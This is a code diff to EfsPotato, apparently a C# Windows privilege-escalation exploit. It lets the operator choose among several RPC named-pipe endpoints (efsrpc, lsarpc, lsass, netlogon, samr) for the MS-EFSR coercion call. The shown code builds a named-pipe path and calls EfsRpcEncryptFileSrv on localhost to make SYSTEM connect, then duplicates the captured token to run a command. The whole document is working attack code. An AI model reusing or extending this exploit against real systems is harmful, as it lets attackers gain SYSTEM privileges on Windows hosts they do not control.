@@ -13,7 +13,11 @@ namespace EfsPotato.Library
 
     internal class Modules
     {
-        public static bool GetSystem(string command, int sessionId, bool interactive)
+        public static bool GetSystem(
+            string command,
+            string endpointPipeName,
+            int sessionId,
+            bool interactive)
         {
             IntPtr hPipe;
             var status = false;
@@ -21,7 +25,21 @@ namespace EfsPotato.Library
             {
                 Win32Consts.SE_IMPERSONATE_NAME
             };
-            Globals.PipeName = string.Format("{{{0}}}", Guid.NewGuid().ToString().ToUpper());
+            var validEndpoints = new List<string>
+            {
+                "efsrpc", "lsarpc", "lsass", "netlogon", "samr"
+            };
+            Globals.UserPipeName = string.Format("{{{0}}}", Guid.NewGuid().ToString().ToUpper());
+
+            if (!validEndpoints.Contains(endpointPipeName.ToLower()))
+            {
+                Console.WriteLine("[-] Invalid endpoint pipe name is specifed.");
+                return false;
+            }
+            else
+            {
+                Globals.EndpointPipeName = endpointPipeName.ToLower();
+            }
 
             if ((sessionId > 0) && interactive)
             {
@@ -48,7 +66,7 @@ namespace EfsPotato.Library
                 int error;
                 IntPtr hDupToken;
                 PROCESS_INFORMATION processInformation;
-                var pipePath = string.Format(@"\\.\pipe\{0}\pipe\srvsvc", Globals.PipeName);
+                var pipePath = string.Format(@"\\.\pipe\{0}\pipe\srvsvc", Globals.UserPipeName);
                 var overwrapped = new OVERLAPPED();
                 var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
                 var spoolerThread = new Thread(new ThreadStart(TriggerPrintSpooler));
@@ -208,16 +226,17 @@ namespace EfsPotato.Library
         private static void TriggerPrintSpooler()
         {
             RPC_STATUS rpcStatus;
-            string filePath = string.Format(@"\\localhost/pipe/{0}\C$\PrivFu.txt", Globals.PipeName);
+            string filePath = string.Format(@"\\localhost/pipe/{0}\C$\PrivFu.txt", Globals.UserPipeName);
 
-            using (var rpc = new MsEfsr())
+            using (var rpc = new MsEfsr(Globals.EndpointPipeName))
             {
                 IntPtr hBinding = rpc.GetEfsrBindingHandle(@"\\127.0.0.1");
 
                 if (hBinding != IntPtr.Zero)
                 {
                     Console.WriteLine("[>] Calling EfsRpcEncryptFileSrv().");
-                    Console.WriteLine("    [*] Target File Path: {0}", filePath.ToString());
+                    Console.WriteLine("    [*] Target File Path   : {0}", filePath.ToString());
+                    Console.WriteLine("    [*] Endpoint Pipe Name : \\piep\\{0}", Globals.EndpointPipeName);
 
                     rpcStatus = rpc.EfsRpcEncryptFileSrv(hBinding, filePath);
                     RpcHelpers.CloseBindingHandle(ref hBinding);
